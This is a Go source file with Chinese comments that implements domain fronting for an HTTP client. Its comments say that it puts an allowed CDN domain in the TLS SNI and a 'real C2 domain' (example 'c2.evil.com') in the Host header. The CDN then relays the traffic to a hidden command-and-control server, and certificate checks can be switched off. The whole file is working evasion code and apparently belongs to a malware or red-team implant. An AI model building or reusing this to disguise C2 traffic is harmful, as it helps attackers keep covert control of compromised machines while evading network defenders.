package transport

import (
	"context"
	"crypto/tls"
	"fmt"
	"net"
	"net/http"
	"time"
)

// NewFrontingTransport 创建一个支持域前置的 HTTP Transport。
//
// 原理：CDN 根据 TLS SNI 路由连接，根据 HTTP Host 路由请求。
// 设置 SNI = frontDomain（允许的 CDN 域名），Host = realDomain（真实 C2 域名），
// CDN 会将请求转发到真实后端。
//
// frontDomain: CDN 前置域名（如 "allowed.cloudfront.net"）
// realDomain:  真实 C2 域名（如 "c2.evil.com"）
// skipVerify:  是否跳过 TLS 证书验证
func NewFrontingTransport(frontDomain, realDomain string, skipVerify bool) *http.Transport {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: skipVerify,
		},
		IdleConnTimeout: 90 * time.Second, // P1-15 fix: prevent connection leak
	}

	// 自定义 TLS 拨号：使用 frontDomain 作为 SNI，但连接目标是 realDomain 解析的 IP
	tr.DialTLSContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
		// addr 是 realDomain:port（来自 http.Request.URL）
		host, port, err := net.SplitHostPort(addr)
		if err != nil {
			return nil, err
		}

		// 解析 realDomain 的 IP（CDN 边缘节点的 IP）
		dialer := &net.Dialer{}

		ips, err := net.DefaultResolver.LookupIP(ctx, "ip4", host)
		if err != nil || len(ips) == 0 {
			// fallback: 用 frontDomain 解析
			ips, err = net.DefaultResolver.LookupIP(ctx, "ip4", frontDomain)
			if err != nil {
				return nil, fmt.Errorf("resolve front domain: %w", err)
			}
		}

		// 连接 CDN 边缘节点
		conn, err := dialer.DialContext(ctx, network, net.JoinHostPort(ips[0].String(), port))
		if err != nil {
			return nil, fmt.Errorf("dial CDN: %w", err)
		}

		// TLS 握手：SNI 设置为 frontDomain
		tlsConn := tls.Client(conn, &tls.Config{
			ServerName:         frontDomain,
			InsecureSkipVerify: skipVerify,
		})

		if err := tlsConn.HandshakeContext(ctx); err != nil {
			conn.Close()
			return nil, fmt.Errorf("tls handshake with SNI=%s: %w", frontDomain, err)
		}

		return tlsConn, nil
	}

	return tr
}

// NewFrontingClient 创建一个支持域前置的 HTTP Client。
// 返回的 client 会自动在请求中设置 Host = realDomain。
func NewFrontingClient(frontDomain, realDomain string, skipVerify bool, timeoutMs int) *http.Client {
	tr := NewFrontingTransport(frontDomain, realDomain, skipVerify)

	return &http.Client{
		Transport: &frontingRoundTripper{
			inner:       tr,
			realHost:    realDomain,
			frontDomain: frontDomain,
		},
		Timeout: 0, // 由 transport 层控制
	}
}

// frontingRoundTripper 包装 http.RoundTripper，确保 Host header 设置为真实域名。
type frontingRoundTripper struct {
	inner       http.RoundTripper
	realHost    string
	frontDomain string
}

func (f *frontingRoundTripper) RoundTrip(req *http.Request) (*http.Response, error) {
	// 克隆请求以避免修改原始请求
	req2 := req.Clone(req.Context())

	// 关键：设置 Host header 为真实 C2 域名
	// CDN 根据此 header 将请求路由到正确的后端
	req2.Host = f.realHost

	// 同时设置 URL.Host 为 frontDomain（确保 TLS SNI 匹配）
	if req2.URL != nil {
		req2.URL.Host = f.frontDomain
		if req2.URL.Port() == "" {
			if req2.URL.Scheme == "https" {
				req2.URL.Host = f.frontDomain + ":443"
			} else {
				req2.URL.Host = f.frontDomain + ":80"
			}
		}
	}

	return f.inner.RoundTrip(req2)
}
